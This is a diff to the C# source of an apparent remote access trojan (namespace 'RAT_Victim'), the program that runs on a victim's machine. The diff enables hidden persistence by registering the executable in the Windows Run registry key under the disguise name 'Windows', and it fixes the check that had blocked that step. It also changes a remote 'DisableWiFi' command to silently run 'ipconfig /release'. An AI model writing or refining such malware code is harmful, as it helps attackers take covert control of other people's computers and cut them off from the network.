@@ -15,7 +15,7 @@ namespace RAT_Victim
 
         private static void Main()
         {
-            //AddToAutoStart();
+            AddToStartup();
             StartServer();
         }
 
@@ -59,11 +59,10 @@ namespace RAT_Victim
                         break;
                     case RatCommand.DisableWiFi:
                         var process = new Process();
-                        process.StartInfo = new ProcessStartInfo("netsh", "interface set interface \"Wi-Fi\" disabled")
-                        {
-                            WindowStyle = ProcessWindowStyle.Hidden,
-                            Verb = "runas"
-                        };
+                        var info = process.StartInfo;
+                        info.FileName = "ipconfig";
+                        info.Arguments = "/release";
+                        info.WindowStyle = ProcessWindowStyle.Hidden;
                         process.Start();
                         break;
                     default:
@@ -72,11 +71,11 @@ namespace RAT_Victim
             }
         }
 
-        private static void AddToAutoStart()
+        private static void AddToStartup()
         {
             var subKey = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
             const string appName = "Windows";
-            if (subKey.GetValue(appName) != null)
+            if (subKey.GetValue(appName) == null)
                 subKey.SetValue(appName, Application.ExecutablePath);
         }
     }
